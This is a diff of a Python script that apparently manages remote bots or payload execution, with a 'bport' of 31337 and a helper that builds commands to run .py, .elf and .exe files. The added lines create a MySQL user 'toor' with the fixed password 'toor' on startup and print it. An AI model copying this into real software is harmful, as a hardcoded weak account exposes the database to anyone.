@@ -5,6 +5,16 @@ import sys
 from getpass import getpass
 threads=[]
 settupinfo={'ip':'0.0.0.0','cport':8000,'bport':31337,'time':300,'username':None,'password':None}
+try:
+    if sys.platform=='linux':
+        try:
+            os.system('service mysql start')
+        except:
+            pass
+    os.system('''mysql -e "create user toor identified by 'toor'"''')
+    print('MYSQL Username and Password is toor')
+except:
+    pass
 def Clear():
     while True:
         if os.system('clear')==1:
@@ -13,7 +23,7 @@ def Clear():
 def Check(lst):
     for x in lst:
         if x.lower().endswith('.py'):
-            return '"/bin/python3 '+x+'"'
+            return '"python3 '+x+'"'
         elif x.lower().endswith('.elf') and sys.platform=='linux':
             return r"./"+x
         elif x.lower().endswith('.exe') and sys.platform=='win32':
@@ -73,6 +83,5 @@ if __name__ == "__main__":
         settupinfo['password']=getpass('MySQL Password:')
     if sys.platform=='linux':
         os.system("service mysql start")
-    print("Settings:"+str(settupinfo))
     Start(settupinfo)
 
